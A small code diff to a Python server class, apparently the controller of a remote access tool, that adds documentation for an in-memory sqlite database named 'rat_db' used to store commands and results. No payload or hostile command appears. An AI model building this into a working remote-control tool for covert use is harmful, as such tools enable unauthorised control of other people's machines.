@@ -23,6 +23,8 @@ class SERVER:
     Methods:
         make_connection()
             Listen for the client
+        make_db()
+            Create a sqlite3 database in memory for storing commands and results
         execute()
         TODO
     TODO
@@ -44,7 +46,10 @@ class SERVER:
         self.port = port
     
     def make_db(db_file):
-        db = sqlite3.connect('file:rat_db?mode=memory&cache=shared')
+        """
+        Create a sqlite3 database in memory for storing commands and results
+        """
+        db = sqlite3.connect('file:rat_db?mode=memory&cache=shared') #If you wanted a local file database instead of in memory you could connect to a local database file like connect(rat_db.db)
         cur = db.cursor()
         cur.execute("DROP TABLE IF EXISTS COMMANDS")
         db.commit()
